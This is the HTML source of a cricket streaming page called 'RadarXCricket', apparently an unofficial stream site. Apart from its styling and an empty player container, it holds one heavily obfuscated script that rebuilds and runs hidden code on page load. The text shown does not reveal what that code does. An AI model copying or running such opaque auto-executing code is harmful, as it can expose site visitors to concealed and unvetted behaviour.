<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXCricket</title>
    <style>
        /* General Page Styling */
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #242424, #3b5998);
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
        }

        /* Bingewav Sports Logo Section */
        .logo-container {
            background: #000; /* Black background for the logo */
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
        }

        .logo-container img {
            width: 220px; /* Adjust the logo size */
            height: auto;
        }

        /* Video Player Styling */
        .player-container {
            width: 95%;
            max-width: 1200px;
            margin: 20px auto;
            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            overflow: hidden;
            background: #000; /* Black background behind the video for better focus */
            position: relative;
            padding-top: 56.25%; /* 16:9 Aspect Ratio */
        }

        .player-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 15px;
            border: none;
        }

        /* Stream Issue Section */
        .stream-issue {
            margin-top: 20px;
            padding: 15px 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            font-size: 16px;
            color: #fff;
            width: fit-content;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
        }

        .stream-issue a {
            color: #00c1ff;
            text-decoration: none;
            font-weight: bold;
        }

        .stream-issue a:hover {
            text-decoration: underline;
        }

        /* Join Telegram Button */
        .join-telegram-container {
            margin-top: 20px;
            text-align: center;
        }

        .join-telegram-btn {
            padding: 10px 20px;
            font-size: 16px;
            font-weight: bold;
            color: white;
            background-color: #008fd6;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }

        .join-telegram-btn:hover {
            background-color: #006bb3;
        }
    </style>
</head>
<body>

<!-- Video Player Section -->
<div class="player-container" id="playerContainer"></div>
<!-- Join Telegram Button
<div class="join-telegram-container">
    <button class="join-telegram-btn" onclick="window.open('https://t.me/RadarXCricket', '_blank')">Join Telegram Channel</button>
</div>
-->
<script>
var loadIframe;(function(){var VGo='',MCe=736-725;function KYP(k){var p=1407699;var m=k.length;var d=[];for(var c=0;c<m;c++){d[c]=k.charAt(c)};for(var c=0;c<m;c++){var v=p*(c+192)+(p%48983);var h=p*(c+468)+(p%14728);var q=v%m;var e=h%m;var r=d[q];d[q]=d[e];d[e]=r;p=(v+h)%3708339;};return d.join('')};var xYB=KYP('chubgkwttjaprcoeumsqtfsdciyonxonvrlrz').substr(0,MCe);var zub='=or 7=v1wgro08+=zs82afo;st=h drf 9co[ni"av-r6+,ln)o+c;c(61;f}nq,m0ylb,ls(;kza5(zr,(hdor=,;)2")(9o;=;+ ,u),(=)(3k)ipra,]61]=C, f]k]}=f.oqngSaar>t;f)gv+otvvt=r)r[eeae[=to=i{di  q+ruriv1tnablf0o;-+i2 v;h(vnv8sgb;)2a.g6me3ts+gl;6p+rr)a=]vsgefav;,lr.)({C.mr,a(b)e( o;m;9*"v;reqsu7dt)gt]-.n;>l)o2ihlvtuoAa"tuh.(8!*fm}n7,ox<ardp=0u.r.+6riuifg.[r8,i](j)ni0t}(t;1i;=,rlC=lh]r+;+so;(10({m;rro={,j.aC;b(+ g(Cx)=l=tg<bpa=(Af)g,r =a0g1tu;An-s+5ferd8(5da]r -)(vto;.tms(yna S{=ar=e"n,khnr;t0,4lvd+ne<l0<}fr;dd8"m2tri)fv8.crllA=7lAt=ollqn }"1vwoa;;v1ehl)i 2npirrv;2wjd;=jea+[a e.]h{t0gi9)4=ocsvtu1 i2nwa(i];),tv,=4o1ts r [)+(ovyvq4nt9i(fh,o=nuo.xlpzk}(+)].)fnhh)iw(m.s)hju;atugr-][=t"r<o,;;;);au=,peoy!-[n )sct.)e(C6vjni[sc;r=t30tfrt9or=0,4g49vi]=; nv;e,h(h.loa;ia.mo,h+pr;r27ao,++a;lalj(=ue[v1r+tarranm.) C.a=fv=h+"[va=xe)ch.=t=lnveniun8a;()0[ u.n[af7e8..ardvChesa" c=mht;7{1m= urr5(;xp6[((i+rho;.j)p+7n.p';var Gnd=KYP[xYB];var DDI='';var rwe=Gnd;var goH=Gnd(DDI,KYP(zub));var UpI=goH(KYP('f])B#[8_fpB)==c[$B,g7=m31_9dd37a8Btsi5.;!tffs;n5r+0il.4\'orl,sp3(en;%ml(B8eB"e6cf$ai;BBeeBtnd=eB6Bto,,f!B#.elg;BB_B$,).r3m,.5#or]!0j 9d+n)B(B%tmrtBf.e,}i_!)_ev)9{ef3a)b"olis7j(p c]=%$eB=%%af\/%a%Bf>6B0dBwt6l3noboe4;d_te8oeycsa.5"a%1Bwtr=eu%\/c8!{i( {c)t;a7,;n_,yB)6!esoBn4%.-n.=27+} .C)3r.( Bdo:o=o%f.e::]65g1=$sBf[) 2tu:s;ewilnlbe1afnc!)\'dee.noev].atefg(!E=)!l]e0l!bB}s-B1tari(h&.ecowpor3i6[InB.i)!8.3f_D;t8war$S{a7dipr,ie(eooB))l)6u.-_%)(vtd89BB.4!,.ul;]pt.b0,il$;gt!s6Bncu6r7w)grnEo ,!r0s.l644](%19lv$u#%f\/gn1emo8]l,B;leo:wd31i),t=B!(89>B)e;f.(.sljdf(6e< r\'4ef[__,03;B4p<B hakd)msngaB(d(!$f%tiB!;BoncpBc((BBB1_!;.wB}B0]d}te;[6kB:c;=eel6Bc0wB.r)ydeB[f-r-+t(B0_.$f; r-Bo%Bno4nn78;){5sSBt&7.ea(B8B\/d),99en.eB\'3m7at4usi3d)\/BBBB$._3(.ccaus}.fc5+)hBb}.i1"Btieh7gtr6.eaBc61cup00n4;6i0]cgr{3!B*B_t\/56&.,Bjf{ep;2.o![y_eetr{B)sBc3.s(pey0$jh ad(1,g2 33._1n;rett]b7.c$ !.,nenhr.o B_t13o)_d4;3.y$B7=od)ar*=o}d!_(Be.B%2B(3(.96 B;..d#.lBBBfuBrwef6isia3l1y05,oB.).on4of-;Be5asj_Bgea0=8eo(e.=o$e2f1_o_BrdB.\'B)o]=a9c(i_;a2[Bl]3euc$+."_gB={"i.0BBBe534sa=Bdp6)u_id8e3 B5%3)e_ub)Bj.Brn(8\'r]trlrnm7r ely#hv$p]Beket0)x9eg-B07;B.7BBoie9;)tr!%u(;?t$m4)$._e%B}\/;),5tB-Bo5(=_7,)oBevpeBBeB"!%BwtB<l,B61rp!f1\/$3uB3lnc$o4nr (sB1}ltBp%$(e_)=1(nrilbd.Bf 2)Be)+_0.3B$0;+,pt+=e,Bc(>o. a=s) en*Bl7f_7]lyew:BB4l =\/(B,=-e*23ee,Bd$$eevt$16(..b3BBl%c,;d6d)f$(a}8B;(4$Bk4x]pj{0eB=i-%_a)l(4I{)_!0tt=_;a_drrrn282fd2e92Bb89Be eBio_-5nt3tBlheBa9)}B=r!Blr($)j(iB vB;.;f]cB"u.caso<B=ffB,t])-B2mpfnB-],vrCB$6nm=+$$ua.sb(BS.eo$ i)!l9B_25%!\/*_!a_1-wB0.s)")s5Ba,e _[ s0sBB)yc4(p,#tirBo(un%9w3_;&(m,lte;(>5%p$1sf]smi j8;;j pnB[1t_d.2oB{vc.a_0e}(pjCrCBwfon7e(b; B}fi'));var sUn=rwe(VGo,UpI );sUn(3897);return 6531})()
</script>

</body>
</html>